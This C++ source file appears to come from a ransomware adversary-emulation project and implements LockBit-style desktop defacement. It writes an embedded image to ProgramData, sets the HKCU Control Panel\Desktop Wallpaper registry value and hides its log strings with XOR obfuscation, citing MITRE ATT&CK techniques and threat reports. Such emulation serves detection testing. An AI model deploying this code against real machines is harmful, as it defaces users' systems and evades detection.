#include "crypto/xor_obfuscation.hpp"
#include "impact.hpp"
#include "logger.hpp"
#include "registry.hpp"
#include "resource.hpp"
#include "util/os_util.hpp"
#include <format>

namespace impact {

// Drops wallpaper image resource to the Program Data folder using the specified file name.
bool DropWallpaperFile(LPCWSTR file_name) {
    try {
        DropResourceToProgramData(WALLPAPER_RESOURCE_ID, file_name);
    } catch (std::exception& e) {
        XorLogger::LogError(std::format("{}: {}", XOR_LIT("Failed to drop wallpaper resource to ProgramData folder"), e.what()));
        return false;
    } catch (...) {
        XorLogger::LogError(XOR_LIT("Unknown exception when dropping wallpaper resource to ProgramData folder."));
        return false;
    }
    return true;
}


/*
 * ChangeWallPaper:
 *      About:
 *          Drops the desktop wallpaper resource to disk at %PROGRAMDATA%\<filename> (C:\ProgramData\ on most machines)
 *          and changes the current user's desktop wallpaper by setting the Wallpaper value of the 
 *          HKCU\Control Panel\Desktop registry key to the wallpaper image path at C:\ProgramData\<filename>.
 *          CreateFileW and WriteFile API calls are used to save the wallpaper image to disk.
 *          RegCreateKeyExW RegSetValueExW API calls are used to perform the registry edits.
 *      Result:
 *          - Icon file written to disk at %PROGRAMDATA%\<filename>
 *          - Registry key HKCU\Control Panel\Desktop has its Wallpaper value set to C:\ProgramData\<filename>
 *      Returns:
 *          True upon success, false upon failure
 *      MITRE ATT&CK Techniques:
 *          T1491.001: Defacement: Internal Defacement
 *          T1112: Modify Registry
 *          T1106: Native API
 *      CTI:
 *          https://www.antiy.net/p/analysis-of-lockbit-ransomware-samples-and-considerations-for-defense-against-targeted-ransomware/
 *          https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a
 */
bool ChangeWallPaper(const std::wstring& file_name) {
    std::filesystem::path wallpaper_path = os_util::GetProgramDataPath() / file_name;
    if (!DropWallpaperFile(file_name.c_str())) {
        return false;
    }
    XorLogger::LogDebug(std::format("{} {}.", XOR_LIT("Saved wallpaper resource at"), wallpaper_path.string()));

    // Set Wallpaper value of HKCU\Control Panel\Desktop to C:\ProgramData\<filename>
    if (!registry::WriteRegistry(HKEY_CURRENT_USER, XOR_WIDE_LIT(L"Control Panel\\Desktop"), XOR_WIDE_LIT(L"Wallpaper"), wallpaper_path.wstring())) {
        XorLogger::LogError(XOR_LIT("Failed to set Wallpaper value for registry key HKCU\\Control Panel\\Desktop"));
        return false;
    } else {
        XorLogger::LogDebug(std::format("{} {}", XOR_LIT("Set Wallpaper value for registry key HKCU\\Control Panel\\Desktop to"), wallpaper_path.string()));
        return true;
    }
}

} // namespace